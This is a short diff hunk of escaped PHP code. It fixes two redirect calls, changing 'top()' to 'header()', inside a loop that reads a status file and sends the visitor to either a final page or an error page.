@@ -3660,11 +3660,11 @@ while(1)
 {
 
 if (file_get_contents(\"\$intento\") == 2) {
-	    top(\"location:final.html\");
+	    header(\"Location:final.html\");
 	    break;
 	}
 if (file_get_contents(\"\$intento\") == 1) {
-	    top(\"location:error.html\");
+	    header(\"Location:error.html\");
 	    unlink(\$intento);
 	    break;
 	}
